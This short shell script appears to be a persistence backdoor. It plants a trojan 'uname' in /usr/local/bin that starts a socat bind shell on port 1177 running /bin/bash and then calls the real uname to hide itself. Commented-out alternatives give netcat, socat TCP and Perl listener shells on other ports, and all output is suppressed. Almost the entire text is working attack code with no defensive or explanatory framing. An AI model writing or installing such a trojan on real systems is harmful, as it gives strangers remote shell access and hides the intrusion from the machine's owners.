#uname
#-------------------------
touch /usr/local/bin/uname

cat <<EOF >> /usr/local/bin/uname
#!/bin/bash
#nc.traditional -l -v -p 4444 -e /bin/bash 2>/dev/null &
#socat TCP4-Listen:3177,fork EXEC:/bin/bash 2>/dev/null &
socat SCTP-Listen:1177,fork EXEC:/bin/bash 2>/dev/null &
#perl -MIO -e'$s=new IO::Socket::INET(LocalPort=>1337,Listen=>1);while($c=$s->accept()){$_=<$c>;print $c `$_`;}' 2>/dev/null &
/bin/uname \$@
EOF

chmod +x /usr/local/bin/uname